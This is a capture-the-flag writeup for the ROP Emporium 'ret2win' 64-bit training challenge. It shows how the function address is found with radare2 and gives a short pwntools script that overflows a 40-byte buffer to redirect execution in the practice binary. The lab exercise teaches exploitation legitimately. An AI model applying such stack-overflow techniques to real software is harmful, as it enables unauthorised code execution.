# ROP EMPORIUM

***

| Challenge          | Walkthrough                                                                                  |
| ------------       | --------                                                                                     |
| [Ret2Win](#ret2win)| [pdf](https://github.com/jpowellroot/Pwnfolio/blob/master/ROP_Emporium/Writeups/Ret2win64.pdf)|
| Split              |                                                                                              |
| Callme             |                                                                                              |
| Write4             |                                                                                              |

***

## RET2WIN 64<a name="ret2win"></a>

> ### 1. Problem
>> In this challenge, there is a function called ret2win located somewhere
>> in the binary which can be used to cat the flag.txt file. The goal is to:
>>
>> - [ ] Find offset of the ret2win function
>>
>> - [ ] Find out the buffer length
>>
>> - [ ] Overflow the buffer and overwrite `$rsp` with the ret2win address offset

> ### 2. Solution
>> - [X] Find offset of the ret2win function
>>> I used the `> afl` command in radare2 to list the functions with their offsets.
>>> This showed me that the ret2win function was located at address 0x00400756.
>>
>> - [X] Find out the buffer length
>>> In the ROP Emporium challenges all of the buffers are 40 bytes long.
>>
>> - [X] Overflow the buffer and overwrite `$rsp` with the ret2win address offset
>>> I used a pwntools script in order to execute the exploit.
~~~python

#!/usr/bin/env python

from pwn import *

elf = context.binary = ELF('ret2win')
context.log_level = 'debug'

padding = cyclic(40)
ret2win = p64(0x00400756)

payload = padding
payload += ret2win

io = process(elf.path)
io.sendline(payload)
io.wait_for_close()
io.recvall()

~~~

**FLAG:**  *ROPE{a_placeholder_32byte_flag!}* 
***
